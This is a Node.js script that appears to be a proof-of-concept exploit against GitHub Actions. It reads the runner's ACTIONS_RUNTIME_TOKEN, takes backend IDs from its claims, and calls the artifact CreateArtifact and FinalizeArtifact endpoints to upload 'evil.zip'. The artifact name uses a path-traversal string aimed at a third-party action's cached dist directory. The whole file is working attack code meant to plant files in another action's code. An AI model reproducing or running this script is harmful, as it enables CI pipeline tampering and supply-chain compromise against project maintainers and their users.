import fs from 'node:fs';
import crypto from 'node:crypto';
const tok = process.env.ACTIONS_RUNTIME_TOKEN;
const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
const claims = JSON.parse(Buffer.from(tok.split('.')[1], 'base64url').toString());
let rid, jid;
for (const sc of claims.scp.split(' ')) {
  const p = sc.split(':');
  if (p[0] === 'Actions.Results' && p.length === 3) { rid = p[1]; jid = p[2]; }
}
console.log('backend ids', rid, jid);
const zip = fs.readFileSync('evil.zip');
const name = 'surefire-pwn/../../../_actions/mikepenz/action-junit-report/6ef3fdcfcd5f0b5d14df3e659ef19b8c6820f93d/dist/test-results/..';
const create = await fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', {
  method: 'POST', headers: {authorization: 'Bearer ' + tok, 'content-type': 'application/json'},
  body: JSON.stringify({workflow_run_backend_id: rid, workflow_job_run_backend_id: jid, name, version: 7, mime_type: 'application/zip'})
});
const cj = await create.json();
console.log('CreateArtifact', create.status, JSON.stringify(cj).slice(0, 160));
if (!cj.signed_upload_url) process.exit(1);
const up = await fetch(cj.signed_upload_url, {method: 'PUT', headers: {'x-ms-blob-type': 'BlockBlob', 'content-type': 'application/zip'}, body: zip});
console.log('blob PUT', up.status);
const hash = 'sha256:' + crypto.createHash('sha256').update(zip).digest('hex');
const fin = await fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact', {
  method: 'POST', headers: {authorization: 'Bearer ' + tok, 'content-type': 'application/json'},
  body: JSON.stringify({workflow_run_backend_id: rid, workflow_job_run_backend_id: jid, name, size: String(zip.length), hash})
});
console.log('FinalizeArtifact', fin.status, (await fin.text()).slice(0, 300));
